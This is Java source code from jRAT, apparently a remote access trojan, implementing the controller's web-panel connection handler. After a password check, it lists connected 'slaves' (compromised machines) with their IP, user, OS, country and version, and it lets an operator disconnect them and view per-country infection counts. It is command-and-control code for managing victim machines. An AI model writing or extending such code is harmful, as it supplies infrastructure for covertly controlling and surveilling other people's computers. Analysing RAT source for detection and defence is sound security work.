package se.jrat.client.webpanel;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.Socket;

import se.jrat.client.AbstractSlave;
import se.jrat.client.Main;
import se.jrat.client.exceptions.CloseException;
import se.jrat.client.settings.CountryStatistics;
import se.jrat.client.settings.CountryStatistics.CountryStatEntry;

import com.redpois0n.graphs.graph.GraphEntry;

public class WebPanelConnection implements Runnable {

	private WebPanelListener parent;
	private Socket socket;
	private BufferedReader br;
	private BufferedWriter bw;

	public WebPanelConnection(WebPanelListener parent, Socket socket) throws Exception {
		this.parent = parent;
		this.socket = socket;
		this.br = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		this.bw = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));
	}

	@Override
	public void run() {
		try {
			String pass = readLine();

            if (!pass.equals(parent.getHashedPassword())) {
                throw new Exception("Failed to auth, got password " + pass);
            }

            int packet;
            while ((packet = readNumber()) != -1) {
            	if (packet == WebPanelPackets.PACKET_LIST) {
                	StringBuilder sb = new StringBuilder();
                	
                	for (AbstractSlave slave : Main.connections) {
                		String[] data = new String[] {                				
                			slave.getUniqueId() + "",
                			slave.getCountry(),
                			slave.formatUserString(),
                			slave.getOperatingSystem() + " " + slave.getArch().toString(),
                			slave.getIP(),
                			"jRAT " + slave.getVersion(),
                			slave.getPing() + "",
                		};

                		for (String e : data) {
                			sb.append(e + ":");
                		}
                		
                		sb.append(";");
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                } else if (packet == WebPanelPackets.PACKET_DISCONNECT) {
                	int slaves = readNumber();
                	
                	for (int i = 0; i < slaves; i++) {
                		long l = Long.parseLong(readLine());
                		AbstractSlave slave = AbstractSlave.getFromId(l);
                		slave.closeSocket(new CloseException("Closed by webpanel"));
                	}
                } else if (packet == WebPanelPackets.PACKET_LISTCOUNTRIES) {
                	StringBuilder sb = new StringBuilder();

                	for (int i = 0; i < CountryStatistics.getGlobal().getList().size(); i++) {
            			CountryStatEntry entry = CountryStatistics.getGlobal().getList().get(i);
            			try {
            				GraphEntry total = new GraphEntry(entry.getCountry(), entry.getConnects());
            				
            				sb.append(total.getDisplay() + "," + total.getNumber());
            				sb.append(";");
            			} catch (Exception ex) {
            				ex.printStackTrace();
            			}
                	}
                	
                	bw.write(sb.toString() + "\n");
                	bw.flush();
                }
            }

			socket.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public String readLine() throws Exception {
		return br.readLine().trim();
	}

	public int readNumber() throws Exception {
		return Integer.parseInt(readLine());
	}
}
